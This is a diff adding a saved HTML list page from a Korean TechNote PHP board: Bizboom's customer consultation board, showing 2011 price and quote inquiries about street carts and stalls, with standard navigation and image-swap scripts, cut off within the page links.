@@ -1,0 +1,1119 @@
+<!--
+TechNote PHP 006.2. 20060210. Freeware
+Copyright(c)2006 TECHNOTE INC WebBoard reserved.
+http://www.technote.co.kr
+-->
+
+<HTML>
+    <HEAD>
+
+        <TITLE>테크노트 PHP</TITLE>
+        <meta http-equiv='Content-Type' content='text/html; charset=euc-kr'>        <META http-equiv='cache-control' content='no-cache'>
+        <META http-equiv='pragma' content='no-cache'>
+
+        <STYLE TYPE='text/css'>
+            body,td,input,div,form,select,textarea,pre{font-size:9pt; font-family:굴림,Tahoma; word-break:break-all;}
+            form{margin:0; padding:0;}
+            a,label{cursor:pointer;}
+            A:link{text-decoration:none; color:#0077ff;}
+            A:visited{text-decoration:none; color:#0077ff;}
+            A:hover{text-decoration:none; color:#FF5005;}
+        </STYLE>
+
+        <!-- ■ 자바스크립트 삽입됨 -->
+        	<script language="JavaScript">
+		this_url		="/bizboom/board.php?board=counsel";
+		this_skin	="./skin_board/a_standard";
+		is_Admin	="";
+		is_Member="";
+		TnTimgurl="./img";
+
+	</script>
+	<script language='JavaScript' src="./skin_board/a_standard/b_script/main_script.js"></script>
+	<script language='JavaScript' src="./skin_board/a_standard/iwindow/create_iwindow.js"></script>
+
+
+    </HEAD>
+
+    <BODY bgcolor='#ffffff' text='#000000' topmargin=0 leftmargin=0 rightmargin=0>
+
+         <!-- ■ 보드 - 본문글 삽입됨 -->
+         
+         <!-- ■ 보드 - 글목록 삽입됨 -->
+         
+
+
+
+
+
+<!-- ★ 글목록 테이블 CSS -->
+<style type='text/css'>
+
+	A.subjectColor:link		{text-decoration:none; color:#000000;} /*글제목: 읽지 않은 글 */
+	A.subjectColor:visited	{text-decoration:none; color:#a5a5a5;} /*글제목: 읽은 글 */
+	A.subjectColor:hover	{text-decoration:none; color:#f44500;} /*글제목: 마우스OVER */
+
+	#mainIndexTable td{} /*글목록 전체 <td>*/
+	.head_td			{height:15px; font-size:8pt; font-family:돋움; letter-spacing:-1; padding-top:2px; border-width:0; background-image:url('./skin_board/a_standard/b_img/attrib/th_bg.gif');;}
+	.head_td img	{border-width:0;}	.head_td a:link,a:visited{color:#333333;}
+	.list_default		{padding-left:2px;}
+	.list_check		{text-align:center; width:20px;}
+	.list_no				{text-align:center; font-size:8pt; font-family:Tahoma,돋움;}
+	.list_subject		{width:; word-break:break-all; padding-left:2px;}
+	.font_repcnt		{color:#278BE9; font-size:7pt; font-family:Tahoma,돋움;}
+	.list_name			{text-align:left; letter-spacing:-1; padding-left:2px;}
+	.list_date			{text-align:center; font-size:8pt; font-family:Tahoma,돋움; width:70;}
+	.list_hit				{text-align:center; font-size:8pt; font-family:Tahoma,돋움; color:#555555; width:30;}
+	.list_category	{text-align:center; letter-spacing:-1; padding:0 1 0 1;}
+	.list_other		{text-align:center;}
+	.list_wr_add		{padding-left:2px;} /*입력란 추가 생성한 <td>*/
+	.list_hr_tr			{display:;}
+	.list_hr_line		{height:1; background-color:#F4f3f1; padding:0; }
+	.list_photo		{background-color:#ffffff; border:2px solid #f0f0f0; width:100;;}
+	.list_thumbnail	{background-color:#ffffff; border:2px solid #f0f0f0; width:100;;}
+	.font8pt			{font-size:8pt; font-family:돋움; color:#666666;}
+	.page_number	{color:#444444; font-size:8pt; font-family:Tahoma,돋움; border:1px solid #dddddd; background-color:#ffffff;  padding:0px 2px; margin-left:3px;} /*글목록 페이지 번호*/
+	#opennumber{background-color:#e6e9e7;} /*본문 출력된 글제목 바탕색*/
+	#mainbutton_td img{margin-left:7px;} /* 하단 메인버튼*/
+</style>
+
+
+	<!--- ★ 보드설정→[2-30] "전체 상단에 내용 삽입" --->
+	<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+</head>
+
+<body  bgcolor=#ffffff leftmargin="0" topmargin="0"  marginheight="0" marginwidth="0" onLoad="MM_preloadImages('../street_furniture/images/menu_01_cart_r.gif','../street_furniture/images/menu_02_booth_r.gif','../street_furniture/images/menu_03_minihouse_r.gif','../street_furniture/images/menu_04_street_r.gif','../street_furniture/images/menu_09_option_r.gif','images/menu_05_spotphoto_r.gif','images/menu_06_customer_r.gif','../street_furniture/images/menu_07_infor_r.gif','../street_furniture/images/menu_08_intrior_r.gif')">
+<table width="940" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td valign="top"><table width="940" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td width="231" valign="top"><a href="http://www.bizboom.co.kr/"><img src="../street_furniture/images/sub_logo.gif" width="231" height="73" border="0"></a></td>
+          <td width="919" align="right" valign="top"><a href="../street_furniture/intro.php"><img src="../street_furniture/images/sub_top.gif" width="695" height="73" border="0"></a></td>
+        </tr>
+        <tr align="center" valign="top" bgcolor="#7d95af"> 
+          <td height="75" colspan="2">
+		  <table border="0" cellspacing="0" cellpadding="0" bgcolor="#576878">
+              <tr>
+                <td><img src="../street_furniture/images/menu_00.gif" width="91" height="75"></td>
+                <td><a href="../bizboom_tech/bizboom_cart.cgi" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image4','','../street_furniture/images/menu_01_cart_r.gif',1)"><img src="../street_furniture/images/menu_01_cart.gif" name="Image4" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="../bizboom_tech/bizboom_booth.cgi" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image5','','../street_furniture/images/menu_02_booth_r.gif',1)"><img src="../street_furniture/images/menu_02_booth.gif" name="Image5" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="../bizboom_tech/bizboom_minihouse.cgi" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image6','','../street_furniture/images/menu_03_minihouse_r.gif',1)"><img src="../street_furniture/images/menu_03_minihouse.gif" name="Image6" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="../bizboom_tech/bizboom_modeling.cgi" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image7','','../street_furniture/images/menu_04_street_r.gif',1)"><img src="../street_furniture/images/menu_04_street.gif" name="Image7" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="../street_furniture/option.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image8','','../street_furniture/images/menu_09_option_r.gif',1)"><img src="../street_furniture/images/menu_09_option.gif" name="Image8" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=spot_photo" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image9','','../street_furniture/images/menu_05_spotphoto_r.gif',1)"><img src="../street_furniture/images/menu_05_spotphoto.gif" name="Image9" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="http://www.bizboom.co.kr/bizboom/board.php?board=counsel" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image10','','../street_furniture/images/menu_06_customer_r.gif',1)"><img src="../street_furniture/images/menu_06_customer.gif" name="Image10" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=infor" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image11','','../street_furniture/images/menu_07_infor_r.gif',1)"><img src="../street_furniture/images/menu_07_infor.gif" name="Image11" width="48" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><a href="http://www.bizboom.co.kr/bizboom_tech/main.cgi?board=interior" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image12','','../street_furniture/images/menu_08_intrior_r.gif',1)"><img src="../street_furniture/images/menu_08_intrior.gif" name="Image12" width="49" height="75" border="0"></a></td>
+                <td width="3"> </td>
+                <td><img src="../street_furniture/images/menu_00_final.gif" width="16" height="75"></td>
+              </tr>
+            </table></td>
+        </tr>
+      </table></td>
+  </tr>
+  <tr> 
+    <td><table width="940" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td width="705" align="center" valign="top">
+		  
+
+	<!--- ★ [보드설정]→[4-30] "글목록 상단에 내용 삽입" --->
+	<!--타이틀 부분--><br>
+ <table border=0 cellpadding=0 cellspacing=0 width=640 style='margin-bottom:7px;'>
+    <tr>
+       <td style='width:185; border-left:0px solid #FFFFFF; padding-left:5;
+           FILTER:shadow(color=#c8c8c8,direction=135, strength=3); line-height:130%;'>
+          <span style='font-size:8pt; font-family:Tahoma; color:#777777'>&nbsp;Bizboom business talk </span><br>
+          <span style='font-size:11pt; font-family:돋움; color:#000000;'><b>BIZBOOM 고객 1:1 상담</b></span>
+       </td>
+       <td style='color:#777777; line-height:120%;' align="right">
+                        <a href="../street_furniture/customer_board_old.php"> 2006년 9월 이전 상담자료 보기<font color="red"> ▶</font></a>
+              </td>
+    </tr>
+    <tr><td colspan="2"><hr></td></tr>
+   </table>
+<table border=0 cellpadding=0 cellspacing=0 width=640><tr><td>
+저희 비즈붐은 고객님들의 의견을 적극 반영하여, 차별화된 제품만을 공급하여 드릴 것을 약속드립니다. 감사합니다.<br>
+<br>
+▣ 공지사항<br>
+문의하신 내용에 대한 답변은 홈페이지에서 확인해주시기 바랍니다. 답변내용은 이메일로 발송하지 않습니다. 
+</td></tr></table>
+<p><br>
+
+<div style="width:640; padding:0;">
+
+		<!-- ★ 좌.상단 TOOL BAR(도구모음) & 버튼(각 버튼별 출력 여부는 보드설정-[4-20]에서 설정함) -->
+		<table border=0 cellpadding=0 cellspacing=0 width='100%'>
+			<tr>
+				<td valign=bottom style='padding-left:15'>
+			</td>
+				<td align=right>
+									</td>
+			</tr>
+		</table>
+
+
+		<!-- ★ 글목록 Main -->
+		<table id='mainIndexTable' cellpadding=0  cellspacing=0 width='100%' border=0>
+			<tbody style='background-color:#ffffff;'>
+			<tr align=center style='color:#555555;'>
+<td class=head_td style='width:20; '><a href='#rest' onclick="iwindow_OPEN('iwindow_check','ckk','','width=115,height=127,autoclose=n')"><img src='./skin_board/a_standard/b_img/attrib/th_check.gif' border=0 onmouseover="balloon_on('다중선택 옵션',this,-18,0)" onmouseout=balloon_off()></a></td>
+<td class=head_td width=40><img src='./skin_board/a_standard/b_img/attrib/th_no.gif'></td>
+<td class=head_td width=2></td>
+<td class=head_td align=left><img src='./skin_board/a_standard/b_img/attrib/th_subject.gif'></td>
+<td class=head_td>상담신청결과</td>
+<td class=head_td><a href='/bizboom/board.php?board=counsel&page=1&sort=comment'><img src='./skin_board/a_standard/b_img/attrib/th_re.gif'></a></td>
+<td class=head_td></td>
+<td class=head_td align=left><img src='./skin_board/a_standard/b_img/attrib/th_name.gif'></td>
+<td class=head_td><img src='./skin_board/a_standard/b_img/attrib/th_date.gif'></td>
+</tr>
+
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck1' value='1380' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1312	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1380&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1380> 가격과 사이즈문의 드립니다</a> <img src='./skin_board/a_standard/b_img/attrib/new.gif' border=0>
+</td>
+
+
+
+			<td class=list_wr_add>
+				상담신청			</td>
+
+		
+	<td class=list_hit>
+			</td>
+
+<td></td>
+	<td class=list_name>
+		권영희</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-08-13&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck2' value='1379' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1311	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1379&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1379> 각종 마차 문의 드립니다..</a> <img src='./skin_board/a_standard/b_img/attrib/new.gif' border=0>
+</td>
+
+
+
+			<td class=list_wr_add>
+				상담신청			</td>
+
+		
+	<td class=list_hit>
+			</td>
+
+<td></td>
+	<td class=list_name>
+		이승일</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-08-12&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck3' value='1378' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1310	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1378&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1378> 옷가게앞에이쁜매대제작도가능할까요?</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				상담신청			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		김수진</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-08-08&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck4' value='1377' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1309	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1377&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1377> 커피판매</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				상담신청			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		바리스타</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-08-05&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck5' value='1376' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1308	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1376&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1376> 수원장안문에있는오뎅바가격문의요</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		황인철</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-29&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck6' value='1375' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1307	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1375&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1375> 가격 문의 드립니다</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		배재훈</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-29&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck7' value='1374' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1306	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1374&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1374> 럭셔리오뎅빠가격문의요~</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		이영란</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-26&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck8' value='1373' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1305	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1373&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1373> 가격문의 두번째드립니다</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				상담신청			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		허정일</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-19&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck9' value='1372' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1304	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1372&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1372> 답변좀 주세요</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		김민현</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-18&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck10' value='1371' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1303	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1371&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1371> 마차 문의 합니다</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		이화동</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-17&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck11' value='1370' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1302	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1370&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1370> 문의좀 드립니다.</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		2	</td>
+
+<td><a href='#xrest' onclick="OpenWin_smart('/bizboom/board.php?board=counsel&command=item&exe=download&clmkey=ufile1&no=1370&file=0.jpg','',400,400,100,100,1,1)"><img hspace=1 src="./img/file/img.gif" border=0 align=absmiddle onmouseover="balloon_on('0.jpg (311KB)',this,-20,2)" onmouseout=balloon_off()></a></td>
+	<td class=list_name>
+		김민현</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-14&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck12' value='1369' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1301	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1369&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1369> 문의 드려요..</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		창업준비중</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-12&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck13' value='1368' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1300	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1368&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1368> 견적문의드립니다</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		허정일</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-10&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck14' value='1367' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1299	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1367&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1367> 호떡마차에대해</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		창업자</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-09&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck15' value='1366' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1298	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1366&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1366> 닭꼬치 노점 마차 문의요 ^^</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		도민수</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-06&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+
+	<tr onMouseOver=this.style.backgroundColor='#fdfdfc' onMouseOut=this.style.backgroundColor='' height='24' >
+
+
+	<td class=list_check>
+			<input type=checkbox id='manyCheck16' value='1365' style='width:11;'>
+	</td>
+
+
+	<td class=list_no><nobr>
+		1297	</td>
+
+	<td class=list_category></td>
+
+<td class=list_subject>
+
+	<a onclick="iwindow_OPEN('iwindow_secret','','no=1365&open_type=0','width=230,height=70')" class=subjectColor><img src='./skin_board/a_standard/b_img/attrib/lock.gif' align=absmiddle border=0><span id=opennumber1365> 가격</a>
+</td>
+
+
+
+			<td class=list_wr_add>
+				답변완료			</td>
+
+		
+	<td class=list_hit>
+		1	</td>
+
+<td></td>
+	<td class=list_name>
+		박경하</span>	</td>
+
+
+	<td class=list_date>
+		<nobr>2011-07-01&nbsp;</nobr>
+	</td>
+
+</tr>
+
+
+	<tr class=list_hr_tr>
+		<td colspan="9" class=list_hr_line></td>
+	</tr>
+
+		</table>
+
+
+		<!-- ★ 글목록 하단-->
+		<table border=0 cellspacing=0 cellpadding=5 width='100%' style='margin-top:7px;'>
+			<tr>
+				<td id='mainbutton_td'>
+
+					<a href='/bizboom/board.php?board=counsel&command=list&page=2'><img src='./skin_board/a_standard/b_img/i_button/next.gif' align=absmiddle border=0></a><a href='/bizboom/board.php?board=counsel&command=write&reply='><img src='./skin_board/a_standard/b_img/i_button/write.gif' align=absmiddle border=0></a>
+				</td>
+				<td align=right valign=top>
+						<a href='/bizboom/board.php?board=counsel&no=&command=list&page=1' class=page_number><font color=#ff5500>1</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=2' class=page_number><font color=#555555>2</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=3' class=page_number><font color=#555555>3</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=4' class=page_number><font color=#555555>4</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=5' class=page_number><font color=#555555>5</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=6' class=page_number><font color=#555555>6</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=7' class=page_number><font color=#555555>7</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=8' class=page_number><font color=#555555>8</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=9' class=page_number><font color=#555555>9</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=10' class=page_number><font color=#555555>10</font></a><a href='/bizboom/board.php?board=counsel&no=&command=list&page=11' class=page_number><img src='./skin_board/a_standard/b_img/icons/arrow_right.gif' border=0 align=absmiddle></a><font size=1>,,,</font><a href='/bizboom/board.php?board=counsel&no=&command=list&page=82' 